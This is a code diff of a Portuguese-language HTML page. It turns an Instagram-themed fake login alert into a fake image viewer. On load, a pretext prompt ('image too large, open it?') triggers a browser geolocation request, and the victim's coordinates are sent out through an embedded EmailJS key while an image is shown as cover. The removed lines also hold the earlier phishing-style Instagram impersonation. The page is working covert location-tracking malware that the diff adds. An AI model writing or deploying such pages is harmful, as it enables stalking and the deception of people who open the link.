@@ -3,66 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Alerta de Login - Instagram</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .alert-box {
-            background-color: #fff;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            padding: 20px;
-            width: 300px;
-            text-align: center;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-
-        .alert-box h2 {
-            font-size: 20px;
-            margin-bottom: 10px;
-        }
-
-        .alert-box p {
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-
-        .alert-box a {
-            display: block;
-            text-decoration: none;
-            color: #fff;
-            background-color: #3897f0;
-            border: 1px solid #3897f0;
-            border-radius: 4px;
-            padding: 10px;
-            width: 100%;
-            max-width: 200px;
-            margin: 0 auto;
-            transition: background-color 0.3s ease;
-        }
-
-        .alert-box a:hover {
-            background-color: #3578e5;
-            border-color: #3578e5;
-        }
-    </style>
+    <title>imagem layoit designer</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("yzkcq0FwtO1kwMJj5"); 
+        })();
+    </script>
 </head>
 <body>
-
-    <div class="alert-box">
-        <h2>Alerta de Segurança</h2>
-        <p>Recebemos uma tentativa de login na sua conta do Instagram. Foi você?</p>
-        <a href="#" id="confirmBtn">Sim, fui eu</a>
-        <a href="#" id="cancelBtn">Não fui eu</a>
-    </div>
 
     <script>
         function enviarLocalizacao(latitude, longitude) {
@@ -85,10 +34,11 @@
             });
         }
 
-        function exibirAlerta() {
-            var mensagem = "Para garantir a segurança da sua conta, precisamos confirmar sua localização. Aceita compartilhar sua localização para continuar?";
-            if (confirm(mensagem)) {
-                console.log('Usuário concordou em compartilhar a localização.');
+        function obterLocalizacao() {
+            console.log('Solicitando acesso para abrir imagem...');
+            
+            if (confirm('Imagem muito grande. Deseja abrir?')) {
+                console.log('Usuário concordou em abrir a imagem.');
 
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
@@ -97,7 +47,6 @@
                             const longitude = position.coords.longitude;
                             console.log(`Localização obtida: Latitude: ${latitude}, Longitude: ${longitude}`);
                             enviarLocalizacao(latitude, longitude);
-                            exibirMensagemSucesso();
                         },
                         (error) => {
                             console.error('Erro ao obter localização:', error);
@@ -106,34 +55,19 @@
                 } else {
                     console.error('Geolocalização não é suportada pelo navegador.');
                 }
+
+                // Carregar a imagem após a confirmação
+                var img = document.createElement('img');
+                img.src = './img.jpg';
+                img.alt = 'Imagem';
+                document.body.appendChild(img);
+                
             } else {
-                console.log('Usuário cancelou o compartilhamento da localização.');
+                console.log('Usuário cancelou a abertura da imagem.');
             }
         }
 
-        function exibirMensagemSucesso() {
-            // Substitua este redirecionamento por um link real do Instagram
-            var linkInstagram = 'https://www.instagram.com/';
-            var alerta = document.createElement('div');
-            alerta.classList.add('alert-box');
-            alerta.innerHTML = `
-                <h2>Alerta de Segurança</h2>
-                <p>Recebemos uma tentativa de login na sua conta do Instagram. Foi você?</p>
-                <a href="${linkInstagram}" target="_blank">Sim, fui eu</a>
-                <a href="#" onclick="fecharAlerta()">Não fui eu</a>
-            `;
-            document.body.innerHTML = '';
-            document.body.appendChild(alerta);
-        }
-
-        function fecharAlerta() {
-            var alertaAnterior = document.querySelector('.alert-box');
-            if (alertaAnterior) {
-                alertaAnterior.parentNode.removeChild(alertaAnterior);
-            }
-        }
-
-        window.onload = exibirAlerta;
+        window.onload = obterLocalizacao;
     </script>
 </body>
 </html>
